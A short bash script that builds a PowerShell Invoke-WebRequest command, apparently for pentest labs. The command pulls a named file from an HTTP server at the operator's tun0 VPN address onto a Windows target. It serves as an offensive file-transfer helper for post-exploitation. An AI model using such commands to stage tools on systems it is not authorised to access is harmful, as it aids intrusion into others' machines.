#!/bin/bash

if [ "$#" -lt 1 ]; then
    printf '%s <downloadfile> [downloadpath (e.g. C:/Users/Ted/Downloads/)]' "$0" 1>&2
    exit 1
fi

path='./'

if [ "$#" -ge 2 ]; then
    path="$2"
fi

ip="$(ip a s tun0 | grep -oP '(\d{1,3}\.){3}\d{1,3}')"
printf 'Invoke-WebRequest -UseBasicParsing http://%s/%s -OutFile %s%s' "$ip" "$1" "$path" "$1"
